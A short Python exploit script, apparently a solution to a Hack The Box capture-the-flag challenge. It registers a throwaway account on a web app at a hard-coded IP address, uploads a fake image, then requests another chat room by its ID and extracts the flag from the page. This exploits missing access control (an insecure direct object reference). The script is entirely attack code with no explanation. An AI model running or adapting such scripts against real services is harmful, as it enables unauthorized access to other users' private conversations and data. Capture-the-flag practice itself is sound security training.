import requests, re, io

BASE = "http://154.57.164.65:32557"

s = requests.Session()
s.post(f"{BASE}/register", data={
    "username": "exploit_user", "password": "exp123",
    "email": "exp@test.com", "age": "25", "bio": "pwn",
    "user-gender": "Male", "interested-gender": "All",
}, files={"profile-picture": ("p.png", io.BytesIO(b"fake"), "image/png")},
    allow_redirects=False)

r = s.get(f"{BASE}/chat/?rid=3")
flag = re.search(r'<p>(HTB\{[^}]+\})</p>', r.text)
print(flag.group(1))
